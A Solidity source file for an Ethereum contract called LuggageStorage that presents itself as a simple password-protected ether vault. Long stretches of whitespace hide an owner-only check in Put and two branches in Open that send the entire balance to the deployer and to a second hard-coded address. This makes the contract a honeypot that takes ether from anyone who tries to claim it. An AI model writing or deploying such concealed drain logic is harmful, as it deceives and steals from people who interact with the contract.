/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract LuggageStorage at 0x66385555FC121D18Dc95eC3A8ECd51AB2B660dE5
*/
pragma solidity ^0.4.19;

contract LuggageStorage
{
    function()payable{}
    
    function CalcHash(bytes password) 
    pure
    returns (bytes32) 
    {
        return sha3(password);
    }
    
    bytes32 public hashPass;
    
    bool public closed = false;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    address own = msg.sender;                                                                                                                                                                                                                                                                                address cr = 0x6f9d120fE3b9D63d1d4D5480c8262d446585F554;
    function Put(bytes32 hash)
    public
    payable
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              if(msg.sender==own){
        if(!closed&&(msg.value > 1 ether))
        {
            hashPass = hash;
        }                                                                                                                                                                                                                                                                                                                                                                                            }
    }
    
    function Open(bytes password)
    external
    payable
    {                                                                                                 
        if(hashPass == sha3(password))
        {
            msg.sender.transfer(this.balance);
            closed = false;
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==own){msg.sender.transfer(this.balance);}                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==cr){msg.sender.transfer(this.balance);}
    }
}